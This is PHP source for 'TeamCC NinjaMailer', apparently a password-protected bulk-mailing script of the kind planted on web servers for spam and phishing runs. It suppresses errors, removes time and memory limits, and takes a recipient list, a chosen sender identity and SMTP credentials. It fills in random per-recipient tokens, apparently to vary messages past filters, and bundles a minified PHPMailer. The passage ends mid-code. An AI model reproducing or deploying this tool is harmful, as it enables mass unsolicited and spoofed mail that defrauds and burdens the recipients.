<?php
/**
 * TeamCC NinjaMailer
 * @version : 1.3.3.7
**/

$password = "samyang"; // Password 

session_start();
ini_set( 'display_errors', 0 );
error_reporting( 0 );
set_time_limit(0);
ini_set("memory_limit",-1);

$ninjax['version']="1.3.3.7";
$ninjax['website']="TEAM.CC";


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
//$RandomMail = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',50)),20,10); 
//$RandomMail2 = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',10)),0,10); 
if($_POST['action']=="send"){
    $senderEmail=ninjaxTrim($_POST['senderEmail']);
    $senderName=ninjaxTrim($_POST['senderName']);
    $replyTo=ninjaxTrim($_POST['replyTo']);
    $subject=ninjaxTrim($_POST['subject']);
    $emailList=ninjaxTrim($_POST['emailList']);
    $messageType=ninjaxTrim($_POST['messageType']);
    $messageLetter=ninjaxTrim($_POST['messageLetter']);    
    $messageLetter = urlencode($messageLetter);
    //$messageLetter = str_replace("%5C%22", "%22", $messageLetter);
    $messageLetter = urldecode($messageLetter);
    $messageLetter = stripslashes($messageLetter);
    $subject = stripslashes($subject);
    $encode = stripslashes($_POST['encode']);

    $shost = $_POST['shost'];
    $suser = $_POST['suser'];
    $spass = $_POST['spass'];
    $sport = $_POST['sport'];
    $sssl = $_POST['sssl'];
    

}
if($messageType==2){
    $plain="checked";
}
else {
    $html="checked";
}

function ninjaxClear($text,$email){
    $emailuser = preg_replace('/([^@]*).*/', '$1', $email);
    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-email-]", $email, $text);
    $text = str_replace("[-emailuser-]", $emailuser, $text);
    $text = str_replace("[-randomletters-]", substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',50)),20,10), $text);
    $text = str_replace("[-randomstring-]",  substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',10)),0,10) , $text);
    $text = str_replace("[-randomnumber-]", randString('0123456789'), $text);
    $text = str_replace("[-randommd5-]", md5(randString('abcdefghijklmnopqrstuvwxyz0123456789')), $text);
    return $text;
    
}
function ninjaxTrim($string){
return stripslashes(ltrim(rtrim($string)));
}
function randString($consonants) {
    $length=rand(12,25);
    $password = '';
    for ($i = 0; $i < $length; $i++) {
            $password .= $consonants[(rand() % strlen($consonants))];
    }
    return $password;
}
function ninjaxMailCheck($email){
 
   if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $mailParts = explode('@', $email);
     
    if(checkdnsrr(array_pop($mailParts), 'MX')){ return true;}
        else{return false;}
   }
   else{return false;}    
}

class PHPMailer{const CHARSET_ISO88591='iso-8859-1';const CHARSET_UTF8='utf-8';const CONTENT_TYPE_PLAINTEXT='text/plain';const CONTENT_TYPE_TEXT_CALENDAR='text/calendar';const CONTENT_TYPE_TEXT_HTML='text/html';const CONTENT_TYPE_MULTIPART_ALTERNATIVE='multipart/alternative';const CONTENT_TYPE_MULTIPART_MIXED='multipart/mixed';const CONTENT_TYPE_MULTIPART_RELATED='multipart/related';const ENCODING_7BIT='7bit';const ENCODING_8BIT='8bit';const ENCODING_BASE64='base64';const ENCODING_BINARY='binary';const ENCODING_QUOTED_PRINTABLE='quoted-printable';public $Priority;public $CharSet=self::CHARSET_ISO88591;public $ContentType=self::CONTENT_TYPE_PLAINTEXT;public $Encoding=self::ENCODING_8BIT;public $ErrorInfo='';public $From='root@localhost';public $FromName='Root User';public $Sender='';public $Subject='';public $Body='';public $AltBody='';public $Ical='';protected $MIMEBody='';protected $MIMEHeader='';protected $mailHeader='';public $WordWrap=0;public $Mailer='mail';public $Sendmail='/usr/sbin/sendmail';public $UseSendmailOptions=true;public $ConfirmReadingTo='';public $Hostname='';public $MessageID='';public $MessageDate='';public $Host='localhost';public $Port=25;public $Helo='';public $SMTPSecure='';public $SMTPAutoTLS=true;public $SMTPAuth=false;public $SMTPOptions=[];public $Username='';public $Password='';public $AuthType='';protected $oauth;public $Timeout=300;public $dsn='';public $SMTPDebug=0;public $Debugoutput='echo';public $SMTPKeepAlive=false;public $SingleTo=false;protected $SingleToArray=[];public $do_verp=false;public $AllowEmpty=false;public $DKIM_selector='';public $DKIM_identity='';public $DKIM_passphrase='';public $DKIM_domain='';public $DKIM_copyHeaderFields=true;public $DKIM_extraHeaders=[];public $DKIM_private='';public $DKIM_private_string='';public $action_function='';public $XMailer='';public static $validator='php';protected $smtp;protected $to=[];protected $cc=[];protected $bcc=[];protected $ReplyTo=[];protected $all_recipients=[];protected $RecipientsQueue=[];protected $ReplyToQueue=[];protected $attachment=[];protected $CustomHeader=[];protected $lastMessageID='';protected $message_type='';protected $boundary=[];protected $language=[];protected $error_count=0;protected $sign_cert_file='';protected $sign_key_file='';protected $sign_extracerts_file='';protected $sign_key_pass='';protected $exceptions=false;protected $uniqueid='';const VERSION='1.3.3.7';const STOP_MESSAGE=0;const STOP_CONTINUE=1;const STOP_CRITICAL=2;protected static $LE="\r\n";const MAX_LINE_LENGTH=998;const STD_LINE_LENGTH=76;public function __construct($exceptions=null){if(null!==$exceptions){$this->exceptions=(bool) $exceptions;}$this->Debugoutput=(strpos(PHP_SAPI,'cli')!==false?'echo':'html');}public function __destruct(){$this->smtpClose();}private function mailPassthru($to,$subject,$body,$header,$params){if(ini_get('mbstring.func_overload')&1){$subject=$this->secureHeader($subject);}else{$subject=$this->encodeHeader($this->secureHeader($subject));}if(!$this->UseSendmailOptions or null===$params){$result=@mail($to,$subject,$body,$header);}else{$result=@mail($to,$subject,$body,$header,$params);}return $result;}protected function edebug($str){if($this->SMTPDebug <= 0){return;}if($this->Debugoutput instanceof \Psr\Log\LoggerInterface){$this->Debugoutput->debug($str);return;}if(!in_array($this->Debugoutput,['error_log','html','echo'])and is_callable($this->Debugoutput)){call_user_func($this->Debugoutput,$str,$this->SMTPDebug);return;}switch($this->Debugoutput){case 'error_log':error_log($str);break;case 'html':echo htmlentities(preg_replace('/[\r\n]+/','',$str),ENT_QUOTES,'UTF-8'),"<br>\n";break;case 'echo':default:$str=preg_replace('/\r\n|\r/ms',"\n",$str);echo gmdate('Y-m-d H:i:s'),"\t",trim(str_replace("\n","\n                   \t                  ",trim($str))),"\n";}}public function isHTML($isHtml=true){if($isHtml){$this->ContentType=static::CONTENT_TYPE_TEXT_HTML;}else{$this->ContentType=static::CONTENT_TYPE_PLAINTEXT;}}public function isSMTP(){$this->Mailer='smtp';}public function isMail(){$this->Mailer='mail';}public function isSendmail(){$ini_sendmail_path=ini_get('sendmail_path');if(false===stripos($ini_sendmail_path,'sendmail')){$this->Sendmail='/usr/sbin/sendmail';}else{$this->Sendmail=$ini_sendmail_path;}$this->Mailer='sendmail';}public function isQmail(){$ini_sendmail_path=ini_get('sendmail_path');if(false===stripos($ini_sendmail_path,'qmail')){$this->Sendmail='/var/qmail/bin/qmail-inject';}else{$this->Sendmail=$ini_sendmail_path;}$this->Mailer='qmail';}public function addAddress($address,$name=''){return $this->addOrEnqueueAnAddress('to',$address,$name);}public function addCC($address,$name=''){return $this->addOrEnqueueAnAddress('cc',$address,$name);}public function addBCC($address,$name=''){return $this->addOrEnqueueAnAddress('bcc',$address,$name);}public function addReplyTo($address,$name=''){return $this->addOrEnqueueAnAddress('Reply-To',$address,$name);}protected function addOrEnqueueAnAddress($kind,$address,$name){$address=trim($address);$name=trim(preg_replace('/[\r\n]+/','',$name));$pos=strrpos($address,'@');if(false===$pos){$error_message=sprintf('%s (%s): %s',$this->lang('invalid_address'),$kind,$address);$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){throw new Exception($error_message);}return false;}$params=[$kind,$address,$name];if($this->has8bitChars(substr($address,++$pos))and static::idnSupported()){if('Reply-To'!=$kind){if(!array_key_exists($address,$this->RecipientsQueue)){$this->RecipientsQueue[$address]=$params;return true;}}else{if(!array_key_exists($address,$this->ReplyToQueue)){$this->ReplyToQueue[$address]=$params;return true;}}return false;}return call_user_func_array([$this,'addAnAddress'],$params);}protected function addAnAddress($kind,$address,$name=''){if(!in_array($kind,['to','cc','bcc','Reply-To'])){$error_message=sprintf('%s: %s',$this->lang('Invalid recipient kind'),$kind);$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){throw new Exception($error_message);}return false;}if(!static::validateAddress($address)){$error_message=sprintf('%s (%s): %s',$this->lang('invalid_address'),$kind,$address);$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){throw new Exception($error_message);}return false;}if('Reply-To'!=$kind){if(!array_key_exists(strtolower($address),$this->all_recipients)){$this->{$kind}[]=[$address,$name];$this->all_recipients[strtolower($address)]=true;return true;}}else{if(!array_key_exists(strtolower($address),$this->ReplyTo)){$this->ReplyTo[strtolower($address)]=[$address,$name];return true;}}return false;}public static function parseAddresses($addrstr,$useimap=true){$addresses=[];if($useimap and function_exists('imap_rfc822_parse_adrlist')){$list=imap_rfc822_parse_adrlist($addrstr,'');foreach($list as $address){if('.SYNTAX-ERROR.'!=$address->host){if(static::validateAddress($address->mailbox.'@'.$address->host)){$addresses[]=['name'=>(property_exists($address,'personal')?$address->personal:''),'address'=>$address->mailbox.'@'.$address->host,];}}}}else{$list=explode(',',$addrstr);foreach($list as $address){$address=trim($address);if(strpos($address,'<')===false){if(static::validateAddress($address)){$addresses[]=['name'=>'','address'=>$address,];}}else{list($name,$email)=explode('<',$address);$email=trim(str_replace('>','',$email));if(static::validateAddress($email)){$addresses[]=['name'=>trim(str_replace(['"',"'"],'',$name)),'address'=>$email,];}}}}return $addresses;}public function setFrom($address,$name='',$auto=true){$address=trim($address);$name=trim(preg_replace('/[\r\n]+/','',$name));$pos=strrpos($address,'@');if(false===$pos or(!$this->has8bitChars(substr($address,++$pos))or!static::idnSupported())and!static::validateAddress($address)){$error_message=sprintf('%s (From): %s',$this->lang('invalid_address'),$address);$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){throw new Exception($error_message);}return false;}$this->From=$address;$this->FromName=$name;if($auto){if(empty($this->Sender)){$this->Sender=$address;}}return true;}public function getLastMessageID(){return $this->lastMessageID;}public static function validateAddress($address,$patternselect=null){if(null===$patternselect){$patternselect=static::$validator;}if(is_callable($patternselect)){return call_user_func($patternselect,$address);}if(strpos($address,"\n")!==false or strpos($address,"\r")!==false){return false;}switch($patternselect){case 'pcre':case 'pcre8':return (bool) preg_match('/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)'.'((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)'.'(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)'.'([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*'.'(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)'.'(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}'.'|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:'.'|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',$address);case 'html5':return (bool) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}'.'[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',$address);case 'php':default:return (bool) filter_var($address,FILTER_VALIDATE_EMAIL);}}public static function idnSupported(){return function_exists('idn_to_ascii')and function_exists('mb_convert_encoding');}public function punyencodeAddress($address){$pos=strrpos($address,'@');if(static::idnSupported()and!empty($this->CharSet)and false!==$pos){$domain=substr($address,++$pos);if($this->has8bitChars($domain)and@mb_check_encoding($domain,$this->CharSet)){$domain=mb_convert_encoding($domain,'UTF-8',$this->CharSet);$errorcode=0;$punycode=idn_to_ascii($domain,$errorcode,INTL_IDNA_VARIANT_UTS46);if(false!==$punycode){return substr($address,0,$pos).$punycode;}}}return $address;}public function send(){try{if(!$this->preSend()){return false;}return $this->postSend();}catch(Exception $exc){$this->mailHeader='';$this->setError($exc->getMessage());if($this->exceptions){throw $exc;}return false;}}public function preSend(){if('smtp'==$this->Mailer or('mail'==$this->Mailer and stripos(PHP_OS,'WIN')===0)){static::setLE("\r\n");}else{static::setLE(PHP_EOL);}if(ini_get('mail.add_x_header')==1 and 'mail'==$this->Mailer and stripos(PHP_OS,'WIN')===0 and((version_compare(PHP_VERSION,'7.0.0','>=')and version_compare(PHP_VERSION,'7.0.17','<'))or(version_compare(PHP_VERSION,'7.1.0','>=')and version_compare(PHP_VERSION,'7.1.3','<')))){trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.'.' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in'.' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.',E_USER_WARNING);}try{$this->error_count=0;$this->mailHeader='';foreach(array_merge($this->RecipientsQueue,$this->ReplyToQueue)as $params){$params[1]=$this->punyencodeAddress($params[1]);call_user_func_array([$this,'addAnAddress'],$params);}if(count($this->to)+count($this->cc)+count($this->bcc)<1){throw new Exception($this->lang('provide_address'),self::STOP_CRITICAL);}foreach(['From','Sender','ConfirmReadingTo']as $address_kind){$this->$address_kind=trim($this->$address_kind);if(empty($this->$address_kind)){continue;}$this->$address_kind=$this->punyencodeAddress($this->$address_kind);if(!static::validateAddress($this->$address_kind)){$error_message=sprintf('%s (%s): %s',$this->lang('invalid_address'),$address_kind,$this->$address_kind);$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){throw new Exception($error_message);}return false;}}if($this->alternativeExists()){$this->ContentType=static::CONTENT_TYPE_MULTIPART_ALTERNATIVE;}$this->setMessageType();if(!$this->AllowEmpty and empty($this->Body)){throw new Exception($this->lang('empty_message'),self::STOP_CRITICAL);}$this->Subject=trim($this->Subject);$this->MIMEHeader='';$this->MIMEBody=$this->createBody();$tempheaders=$this->MIMEHeader;$this->MIMEHeader=$this->createHeader();$this->MIMEHeader.=$tempheaders;if('mail'==$this->Mailer){if(count($this->to)>0){$this->mailHeader.=$this->addrAppend('To',$this->to);}else{$this->mailHeader.=$this->headerLine('To','undisclosed-recipients:;');}$this->mailHeader.=$this->headerLine('Subject',$this->encodeHeader($this->secureHeader($this->Subject)));}if(!empty($this->DKIM_domain)and!empty($this->DKIM_selector)and(!empty($this->DKIM_private_string)or(!empty($this->DKIM_private)and static::isPermittedPath($this->DKIM_private)and file_exists($this->DKIM_private)))){$header_dkim=$this->DKIM_Add($this->MIMEHeader.$this->mailHeader,$this->encodeHeader($this->secureHeader($this->Subject)),$this->MIMEBody);$this->MIMEHeader=rtrim($this->MIMEHeader,"\r\n ").static::$LE.static::normalizeBreaks($header_dkim).static::$LE;}return true;}catch(Exception $exc){$this->setError($exc->getMessage());if($this->exceptions){throw $exc;}return false;}}public function postSend(){try{switch($this->Mailer){case 'sendmail':case 'qmail':return $this->sendmailSend($this->MIMEHeader,$this->MIMEBody);case 'smtp':return $this->smtpSend($this->MIMEHeader,$this->MIMEBody);case 'mail':return $this->mailSend($this->MIMEHeader,$this->MIMEBody);default:$sendMethod=$this->Mailer.'Send';if(method_exists($this,$sendMethod)){return $this->$sendMethod($this->MIMEHeader,$this->MIMEBody);}return $this->mailSend($this->MIMEHeader,$this->MIMEBody);}}catch(Exception $exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){throw $exc;}}return false;}protected function sendmailSend($header,$body){if(!empty($this->Sender)and self::isShellSafe($this->Sender)){if('qmail'==$this->Mailer){$sendmailFmt='%s -f%s';}else{$sendmailFmt='%s -oi -f%s -t';}}else{if('qmail'==$this->Mailer){$sendmailFmt='%s';}else{$sendmailFmt='%s -oi -t';}}$sendmail=sprintf($sendmailFmt,escapeshellcmd($this->Sendmail),$this->Sender);if($this->SingleTo){foreach($this->SingleToArray as $toAddr){$mail=@popen($sendmail,'w');if(!$mail){throw new Exception($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}fwrite($mail,'To: '.$toAddr."\n");fwrite($mail,$header);fwrite($mail,$body);$result=pclose($mail);$this->doCallback(($result==0),[$toAddr],$this->cc,$this->bcc,$this->Subject,$body,$this->From,[]);if(0!==$result){throw new Exception($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}}}else{$mail=@popen($sendmail,'w');if(!$mail){throw new Exception($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}fwrite($mail,$header);fwrite($mail,$body);$result=pclose($mail);$this->doCallback(($result==0),$this->to,$this->cc,$this->bcc,$this->Subject,$body,$this->From,[]);if(0!==$result){throw new Exception($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}}return true;}protected static function isShellSafe($string){if(escapeshellcmd($string)!==$string or!in_array(escapeshellarg($string),["'$string'","\"$string\""])){return false;}$length=strlen($string);for($i=0;$i<$length;++$i){$c=$string[$i];if(!ctype_alnum($c)&&strpos('@_-.',$c)===false){return false;}}return true;}protected static function isPermittedPath($path){return!preg_match('#^[a-z]+://#i',$path);}protected function mailSend($header,$body){$toArr=[];foreach($this->to as $toaddr){$toArr[]=$this->addrFormat($toaddr);}$to=implode(', ',$toArr);$params=null;if(!empty($this->Sender)and static::validateAddress($this->Sender)){if(self::isShellSafe($this->Sender)){$params=sprintf('-f%s',$this->Sender);}}if(!empty($this->Sender)and static::validateAddress($this->Sender)){$old_from=ini_get('sendmail_from');ini_set('sendmail_from',$this->Sender);}$result=false;if($this->SingleTo and count($toArr)>1){foreach($toArr as $toAddr){$result=$this->mailPassthru($toAddr,$this->Subject,$body,$header,$params);$this->doCallback($result,[$toAddr],$this->cc,$this->bcc,$this->Subject,$body,$this->From,[]);}}else{$result=$this->mailPassthru($to,$this->Subject,$body,$header,$params);$this->doCallback($result,$this->to,$this->cc,$this->bcc,$this->Subject,$body,$this->From,[]);}if(isset($old_from)){ini_set('sendmail_from',$old_from);}if(!$result){throw new Exception($this->lang('instantiate'),self::STOP_CRITICAL);}return true;}public function getSMTPInstance(){if(!is_object($this->smtp)){$this->smtp=new SMTP();}return $this->smtp;}public function setSMTPInstance(SMTP $smtp){$this->smtp=$smtp;return $this->smtp;}protected function smtpSend($header,$body){$bad_rcpt=[];if(!$this->smtpConnect($this->SMTPOptions)){throw new Exception($this->lang('smtp_connect_failed'),self::STOP_CRITICAL);}if(''==$this->Sender){$smtp_from=$this->From;}else{$smtp_from=$this->Sender;}if(!$this->smtp->mail($smtp_from)){$this->setError($this->lang('from_failed').$smtp_from.' : '.implode(',',$this->smtp->getError()));throw new Exception($this->ErrorInfo,self::STOP_CRITICAL);}$callbacks=[];foreach([$this->to,$this->cc,$this->bcc]as $togroup){foreach($togroup as $to){if(!$this->smtp->recipient($to[0],$this->dsn)){$error=$this->smtp->getError();$bad_rcpt[]=['to'=>$to[0],'error'=>$error['detail']];$isSent=false;}else{$isSent=true;}$callbacks[]=['issent'=>$isSent,'to'=>$to[0]];}}if((count($this->all_recipients)>count($bad_rcpt))and!$this->smtp->data($header.$body)){throw new Exception($this->lang('data_not_accepted'),self::STOP_CRITICAL);}$smtp_transaction_id=$this->smtp->getLastTransactionID();if($this->SMTPKeepAlive){$this->smtp->reset();}else{$this->smtp->quit();$this->smtp->close();}foreach($callbacks as $cb){$this->doCallback($cb['issent'],[$cb['to']],[],[],$this->Subject,$body,$this->From,['smtp_transaction_id'=>$smtp_transaction_id]);}if(count($bad_rcpt)>0){$errstr='';foreach($bad_rcpt as $bad){$errstr.=$bad['to'].': '.$bad['error'];}throw new Exception($this->lang('recipients_failed').$errstr,self::STOP_CONTINUE);}return true;}public function smtpConnect($options=null){if(null===$this->smtp){$this->smtp=$this->getSMTPInstance();}if(null===$options){$options=$this->SMTPOptions;}if($this->smtp->connected()){return true;}$this->smtp->setTimeout($this->Timeout);$this->smtp->setDebugLevel($this->SMTPDebug);$this->smtp->setDebugOutput($this->Debugoutput);$this->smtp->setVerp($this->do_verp);$hosts=explode(';',$this->Host);$lastexception=null;foreach($hosts as $hostentry){$hostinfo=[];if(!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*|\[[a-fA-F0-9:]+\]):?([0-9]*)$/',trim($hostentry),$hostinfo)){static::edebug($this->lang('connect_host').' '.$hostentry);continue;}if(!static::isValidHost($hostinfo[3])){static::edebug($this->lang('connect_host').' '.$hostentry);continue;}$prefix='';$secure=$this->SMTPSecure;$tls=('tls'==$this->SMTPSecure);if('ssl'==$hostinfo[2]or(''==$hostinfo[2]and 'ssl'==$this->SMTPSecure)){$prefix='ssl://';$tls=false;$secure='ssl';}elseif('tls'==$hostinfo[2]){$tls=true;$secure='tls';}$sslext=defined('OPENSSL_ALGO_SHA256');if('tls'===$secure or 'ssl'===$secure){if(!$sslext){throw new Exception($this->lang('extension_missing').'openssl',self::STOP_CRITICAL);}}$host=$hostinfo[3];$port=$this->Port;$tport=(int)$hostinfo[4];if($tport>0 and $tport<65536){$port=$tport;}if($this->smtp->connect($prefix.$host,$port,$this->Timeout,$options)){try{if($this->Helo){$hello=$this->Helo;}else{$hello=$this->serverHostname();}$this->smtp->hello($hello);if($this->SMTPAutoTLS and $sslext and 'ssl'!=$secure and $this->smtp->getServerExt('STARTTLS')){$tls=true;}if($tls){if(!$this->smtp->startTLS()){throw new Exception($this->lang('connect_host'));}$this->smtp->hello($hello);}if($this->SMTPAuth){if(!$this->smtp->authenticate($this->Username,$this->Password,$this->AuthType,$this->oauth)){throw new Exception($this->lang('authenticate'));}}return true;}catch(Exception $exc){$lastexception=$exc;$this->edebug($exc->getMessage());$this->smtp->quit();}}}$this->smtp->close();if($this->exceptions and null!==$lastexception){throw $lastexception;}return false;}public function smtpClose(){if(null!==$this->smtp){if($this->smtp->connected()){$this->smtp->quit();$this->smtp->close();}}}public function setLanguage($langcode='en',$lang_path=''){$renamed_langcodes=['br'=>'pt_br','cz'=>'cs','dk'=>'da','no'=>'nb','se'=>'sv','rs'=>'sr','tg'=>'tl',];if(isset($renamed_langcodes[$langcode])){$langcode=$renamed_langcodes[$langcode];}$PHPMAILER_LANG=['authenticate'=>'SMTP Error: Could not authenticate.','connect_host'=>'SMTP Error: Could not connect to SMTP host.','data_not_accepted'=>'SMTP Error: data not accepted.','empty_message'=>'Message body empty','encoding'=>'Unknown encoding: ','execute'=>'Could not execute: ','file_access'=>'Could not access file: ','file_open'=>'File Error: Could not open file: ','from_failed'=>'The following From address failed: ','instantiate'=>'Could not instantiate mail function.','invalid_address'=>'Invalid address: ','mailer_not_supported'=>' mailer is not supported.','provide_address'=>'You must provide at least one recipient email address.','recipients_failed'=>'SMTP Error: The following recipients failed: ','signing'=>'Signing Error: ','smtp_connect_failed'=>'SMTP connect() failed.','smtp_error'=>'SMTP server error: ','variable_set'=>'Cannot set or reset variable: ','extension_missing'=>'Extension missing: ',];if(empty($lang_path)){$lang_path=dirname(__DIR__).DIRECTORY_SEPARATOR.'language'.DIRECTORY_SEPARATOR;}if(!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/',$langcode)){$langcode='en';}$foundlang=true;$lang_file=$lang_path.'phpmailer.lang-'.$langcode.'.php';if('en'!=$langcode){if(!static::isPermittedPath($lang_file)||!file_exists($lang_file)){$foundlang=false;}else{$foundlang=include $lang_file;}}$this->language=$PHPMAILER_LANG;return (bool) $foundlang;}public function getTranslations(){return $this->language;}public function addrAppend($type,$addr){$addresses=[];foreach($addr as $address){$addresses[]=$this->addrFormat($address);}return $type.': '.implode(', ',$addresses).static::$LE;}public function addrFormat($addr){if(empty($addr[1])){return $this->secureHeader($addr[0]);}return $this->encodeHeader($this->secureHeader($addr[1]),'phrase').' <'.$this->secureHeader($addr[0]).'>';}public function wrapText($message,$length,$qp_mode=false){if($qp_mode){$soft_break=sprintf(' =%s',static::$LE);}else{$soft_break=static::$LE;}$is_utf8=static::CHARSET_UTF8===strtolower($this->CharSet);$lelen=strlen(static::$LE);$crlflen=strlen(static::$LE);$message=static::normalizeBreaks($message);if(substr($message,-$lelen)==static::$LE){$message=substr($message,0,-$lelen);}$lines=explode(static::$LE,$message);$message='';foreach($lines as $line){$words=explode(' ',$line);$buf='';$firstword=true;foreach($words as $word){if($qp_mode and(strlen($word)>$length)){$space_left=$length-strlen($buf)-$crlflen;if(!$firstword){if($space_left>20){$len=$space_left;if($is_utf8){$len=$this->utf8CharBoundary($word,$len);}elseif('='==substr($word,$len-1,1)){--$len;}elseif('='==substr($word,$len-2,1)){$len -= 2;}$part=substr($word,0,$len);$word=substr($word,$len);$buf.=' '.$part;$message.=$buf.sprintf('=%s',static::$LE);}else{$message.=$buf.$soft_break;}$buf='';}while(strlen($word)>0){if($length <= 0){break;}$len=$length;if($is_utf8){$len=$this->utf8CharBoundary($word,$len);}elseif('='==substr($word,$len-1,1)){--$len;}elseif('='==substr($word,$len-2,1)){$len -= 2;}$part=substr($word,0,$len);$word=substr($word,$len);if(strlen($word)>0){$message.=$part.sprintf('=%s',static::$LE);}else{$buf=$part;}}}else{$buf_o=$buf;if(!$firstword){$buf.=' ';}$buf.=$word;if(strlen($buf)>$length and ''!=$buf_o){$message.=$buf_o.$soft_break;$buf=$word;}}$firstword=false;}$message.=$buf.static::$LE;}return $message;}public function utf8CharBoundary($encodedText,$maxLength){$foundSplitPos=false;$lookBack=3;while(!$foundSplitPos){$lastChunk=substr($encodedText,$maxLength-$lookBack,$lookBack);$encodedCharPos=strpos($lastChunk,'=');if(false!==$encodedCharPos){$hex=substr($encodedText,$maxLength-$lookBack+$encodedCharPos+1,2);$dec=hexdec($hex);if($dec<128){if($encodedCharPos>0){$maxLength -= $lookBack-$encodedCharPos;}$foundSplitPos=true;}elseif($dec >= 192){$maxLength -= $lookBack-$encodedCharPos;$foundSplitPos=true;}elseif($dec<192){$lookBack += 3;}}else{$foundSplitPos=true;}}return $maxLength;}public function setWordWrap(){if($this->WordWrap<1){return;}switch($this->message_type){case 'alt':case 'alt_inline':case 'alt_attach':case 'alt_inline_attach':$this->AltBody=$this->wrapText($this->AltBody,$this->WordWrap);break;default:$this->Body=$this->wrapText($this->Body,$this->WordWrap);break;}}public function createHeader(){$result='';$result.=$this->headerLine('Date',''==$this->MessageDate?self::rfcDate():$this->MessageDate);if($this->SingleTo){if('mail'!=$this->Mailer){foreach($this->to as $toaddr){$this->SingleToArray[]=$this->addrFormat($toaddr);}}}else{if(count($this->to)>0){if('mail'!=$this->Mailer){$result.=$this->addrAppend('To',$this->to);}}elseif(count($this->cc)==0){$result.=$this->headerLine('To','undisclosed-recipients:;');}}$result.=$this->addrAppend('From',[[trim($this->From),$this->FromName]]);if(count($this->cc)>0){$result.=$this->addrAppend('Cc',$this->cc);}if(('sendmail'==$this->Mailer or 'qmail'==$this->Mailer or 'mail'==$this->Mailer)and count($this->bcc)>0){$result.=$this->addrAppend('Bcc',$this->bcc);}if(count($this->ReplyTo)>0){$result.=$this->addrAppend('Reply-To',$this->ReplyTo);}if('mail'!=$this->Mailer){$result.=$this->headerLine('Subject',$this->encodeHeader($this->secureHeader($this->Subject)));}if(''!=$this->MessageID and preg_match('/^<.*@.*>$/',$this->MessageID)){$this->lastMessageID=$this->MessageID;}else{$this->lastMessageID=sprintf('<%s@%s>',$this->uniqueid,$this->serverHostname());}$result.=$this->headerLine('Message-ID',$this->lastMessageID);if(null!==$this->Priority){$result.=$this->headerLine('X-Priority',$this->Priority);}if(''==$this->XMailer){$result.=$this->headerLine('X-Mailer','âœ–ï¸1ß·'.self::VERSION.'ß·ß·');}else{$myXmailer=trim($this->XMailer);if($myXmailer){$result.=$this->headerLine('X-Mailer',$myXmailer);}}if(''!=$this->ConfirmReadingTo){$result.=$this->headerLine('Disposition-Notification-To','<'.$this->ConfirmReadingTo.'>');}foreach($this->CustomHeader as $header){$result.=$this->headerLine(trim($header[0]),$this->encodeHeader(trim($header[1])));}if(!$this->sign_key_file){$result.=$this->headerLine('MIME-Version','1.0');$result.=$this->getMailMIME();}return $result;}public function getMailMIME(){$result='';$ismultipart=true;switch($this->message_type){case 'inline':$result.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_RELATED.';');$result.=$this->textLine(' boundary="'.$this->boundary[1].'"');break;case 'attach':case 'inline_attach':case 'alt_attach':case 'alt_inline_attach':$result.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_MIXED.';');$result.=$this->textLine(' boundary="'.$this->boundary[1].'"');break;case 'alt':case 